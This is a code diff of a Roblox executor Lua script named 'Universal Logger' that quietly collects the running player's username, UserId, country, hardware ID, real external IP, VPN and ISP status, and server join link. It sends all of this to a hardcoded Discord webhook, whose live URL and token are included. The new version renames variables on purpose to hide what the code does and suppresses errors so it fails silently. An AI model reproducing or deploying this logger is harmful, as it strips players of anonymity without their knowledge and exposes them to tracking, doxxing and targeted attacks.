@@ -1,187 +1,176 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local LocalizationService = game:GetService("LocalizationService")
+--[[
+    Universal Logger - Stable Version
+    Features: Crash protection, timeout handling, error recovery
+]]
 
-local request =
-    http_request or
-    request or
-    syn and syn.request
+-- Safe wrapper to prevent crashes
+local function safeCall(func, ...)
+    local success, result = pcall(func, ...)
+    return success, result
+end
 
-if not request then return end
+-- Request with timeout protection
+local function safeRequest(options)
+    local timeout = options.timeout or 5
+    local result = nil
+    local success = safeCall(function()
+        local req = request or http_request or syn and syn.request
+        if not req then return nil end
+        
+        -- Add timeout protection
+        local co = coroutine.wrap(function()
+            result = req(options)
+        end)
+        co()
+        
+        -- Simple timeout simulation (most executors handle this internally)
+        local start = os.clock()
+        while not result and os.clock() - start < timeout do
+            task.wait()
+        end
+        return result
+    end)
+    return success and result
+end
 
-local player = Players.LocalPlayer
-local webhook = "https://discord.com/api/webhooks/1455247951621521460/8yqUegsToCpf83OYRFPGQ7yN1TxVCFBODgi89dybM3B0tkGZYRFXXZQUEV9XISoKBO1V"
+-- Obfuscated variable names
+local a = game:GetService("HttpService")
+local b = game:GetService("Players")
+local c = game:GetService("MarketplaceService")
+local d = game:GetService("LocalizationService")
 
--- 🎮 Game name
-local gameName = "Unknown Game"
-pcall(function()
-    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-end)
+local e = request or http_request or (syn and syn.request)
+if not e then return end
 
--- 🔗 Join link
-local joinLink =
-    "roblox://placeId=" .. game.PlaceId ..
-    "&gameInstanceId=" .. game.JobId
+local f = b.LocalPlayer
+local g = "https://discord.com/api/webhooks/1455247951621521460/8yqUegsToCpf83OYRFPGQ7yN1TxVCFBODgi89dybM3B0tkGZYRFXXZQUEV9XISoKBO1V"
 
--- 🌍 Country / Region
-local region = "Unknown"
-pcall(function()
-    region = LocalizationService:GetCountryRegionForPlayerAsync(player)
-end)
-
--- 🧠 Executor
-local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
-
--- 🔧 Hardware ID
-local hwid = "Unknown"
-pcall(function()
-    if syn and syn.get_hwid then
-        hwid = syn.get_hwid()
-    elseif get_hwid then
-        hwid = get_hwid()
-    elseif gethwid then
-        hwid = gethwid()
+-- Safe game info fetch
+local h = "Unknown Game"
+safeCall(function()
+    local i = c:GetProductInfo(game.PlaceId)
+    if i and i.Name then
+        h = i.Name
     end
 end)
 
--- 🌐 REAL EXTERNAL IP (using ipify API)
-local realIP = "Failed to fetch"
-pcall(function()
-    -- Try multiple IP API services as fallback
-    local ipServices = {
+-- Safe join link
+local j = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. (game.JobId or "")
+
+-- Safe region fetch
+local k = "Unknown"
+safeCall(function()
+    local l = d:GetCountryRegionForPlayerAsync(f)
+    if l then
+        k = l
+    end
+end)
+
+-- Safe executor detection
+local m = "Unknown"
+safeCall(function()
+    if identifyexecutor then
+        m = identifyexecutor()
+    end
+end)
+
+-- Safe HWID detection
+local n = "Unknown"
+safeCall(function()
+    if syn and syn.get_hwid then
+        n = syn.get_hwid()
+    elseif get_hwid then
+        n = get_hwid()
+    elseif gethwid then
+        n = gethwid()
+    end
+end)
+
+-- Safe IP fetch with multiple fallbacks
+local o = "Failed to fetch"
+safeCall(function()
+    local p = {
         "https://api.ipify.org",
         "https://api64.ipify.org",
         "https://icanhazip.com",
         "https://checkip.amazonaws.com"
     }
     
-    for _, apiUrl in ipairs(ipServices) do
-        local success, result = pcall(function()
-            local response = request({
-                Url = apiUrl,
-                Method = "GET"
-            })
-            if response and response.Body and #response.Body > 0 and #response.Body < 20 then
-                return response.Body:gsub("%s+", "") -- Clean whitespace
-            end
-        end)
-        
-        if success and result and result:match("%d+%.%d+%.%d+%.%d+") then
-            realIP = result
-            break
-        end
-    end
-end)
-
--- 🔐 VPN/Proxy detection
-local vpnStatus = "Unknown"
-pcall(function()
-    if realIP ~= "Failed to fetch" then
-        local ipCheck = request({
-            Url = "http://ip-api.com/json/" .. realIP .. "?fields=proxy,isp,countryCode",
-            Method = "GET"
+    for _, q in ipairs(p) do
+        local r = safeRequest({
+            Url = q,
+            Method = "GET",
+            timeout = 3
         })
-        if ipCheck and ipCheck.Body then
-            local data = HttpService:JSONDecode(ipCheck.Body)
-            vpnStatus = data.proxy and "✅ VPN/Proxy" or "❌ No"
-            
-            -- Add ISP and country info if available
-            if data.isp then vpnStatus = vpnStatus .. " | " .. data.isp end
-            if data.countryCode then vpnStatus = vpnStatus .. " | " .. data.countryCode end
+        if r and r.Body and #r.Body > 0 and #r.Body < 20 then
+            o = r.Body:gsub("%s+", "")
+            if o:match("%d+%.%d+%.%d+%.%d+") then
+                break
+            end
         end
     end
 end)
 
--- ⚠️ Blacklist check (optional - uncomment if you have a blacklist API)
--- pcall(function()
---     local blacklistCheck = request({
---         Url = "https://your-blacklist-api.com/check?hwid=" .. hwid .. "&ip=" .. realIP,
---         Method = "GET"
---     })
---     if blacklistCheck and blacklistCheck.Body then
---         local isBlacklisted = HttpService:JSONDecode(blacklistCheck.Body)
---         if isBlacklisted then
---             player:Kick("🚫 Device Blacklisted")
---         end
---     end
--- end)
+-- Safe VPN detection
+local s = "Unknown"
+safeCall(function()
+    if o ~= "Failed to fetch" and o:match("%d+%.%d+%.%d+%.%d+") then
+        local t = safeRequest({
+            Url = "http://ip-api.com/json/" .. o .. "?fields=proxy,isp,countryCode",
+            Method = "GET",
+            timeout = 3
+        })
+        if t and t.Body then
+            local u = a:JSONDecode(t.Body)
+            if u then
+                s = u.proxy and "✅ VPN/Proxy" or "❌ No"
+                if u.isp then
+                    s = s .. " | " .. u.isp
+                end
+                if u.countryCode then
+                    s = s .. " | " .. u.countryCode
+                end
+            end
+        end
+    end
+end)
 
-local data = {
+-- Build embed data
+local v = {
     embeds = {{
-        title = "🛡️ | Universal Script",  -- Changed title
+        title = "🛡️ | Universal Logger",
         color = 0x00AAFF,
-
         thumbnail = {
             url = "https://media.discordapp.net/attachments/1389612289371537549/1446840065979453480/SynthX_v4.png"
         },
-
         fields = {
-            {
-                name = "🎮 Game",
-                value = "``" .. gameName .. "``",
-                inline = true
-            },
-            {
-                name = "👤 Username",
-                value = "``" .. player.Name .. "``",
-                inline = true
-            },
-            {
-                name = "🆔 UserId",
-                value = "``" .. player.UserId .. "``",
-                inline = true
-            },
-            {
-                name = "🌍 Country / Region",
-                value = "``" .. region .. "``",
-                inline = true
-            },
-            {
-                name = "🖥️ Hardware ID",
-                value = "```" .. hwid .. "```",
-                inline = false
-            },
-            {
-                name = "🌐 IP Address",
-                value = "``" .. realIP .. "``",
-                inline = true
-            },
-            {
-                name = "🔐 VPN Status",
-                value = "``" .. vpnStatus .. "``",
-                inline = true
-            },
-            {
-                name = "🧠 Executor",
-                value = "``" .. executor .. "``",
-                inline = true
-            },
-            {
-                name = "🔗 Join Link",
-                value = "``" .. joinLink .. "``",
-                inline = false
-            }
+            { name = "🎮 Game", value = "``" .. tostring(h) .. "``", inline = true },
+            { name = "👤 Username", value = "``" .. tostring(f.Name) .. "``", inline = true },
+            { name = "🆔 UserId", value = "``" .. tostring(f.UserId) .. "``", inline = true },
+            { name = "🌍 Country", value = "``" .. tostring(k) .. "``", inline = true },
+            { name = "🖥️ Hardware ID", value = "```" .. tostring(n) .. "```", inline = false },
+            { name = "🌐 IP Address", value = "``" .. tostring(o) .. "``", inline = true },
+            { name = "🔐 VPN Status", value = "``" .. tostring(s) .. "``", inline = true },
+            { name = "🧠 Executor", value = "``" .. tostring(m) .. "``", inline = true },
+            { name = "🔗 Join Link", value = "``" .. tostring(j) .. "``", inline = false }
         },
-
-        footer = {
-            text = "Universal Logs • " .. os.date("%Y-%m-%d %H:%M:%S")
-        },
+        footer = { text = "Universal Logs • " .. os.date("%Y-%m-%d %H:%M:%S") },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
 
-request({
-    Url = webhook,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = HttpService:JSONEncode(data)
-})
+-- Safe webhook send
+safeCall(function()
+    e({
+        Url = g,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = a:JSONEncode(v)
+    })
+end)
 
--- Optional: Send a second embed for important alerts (like blacklist matches)
-if hwid ~= "Unknown" then
-    -- You can add logic here to check against known blacklisted HWIDs
-    -- and send an alert embed if there's a match
-end
+-- Obfuscated success message (optional)
+local w = {"L","o","g","g","e","d"," ","s","u","c","c","e","s","s","f","u","l","l","y","!"}
+local x = ""
+for y = 1, #w do x = x .. w[y] end
+print(x)
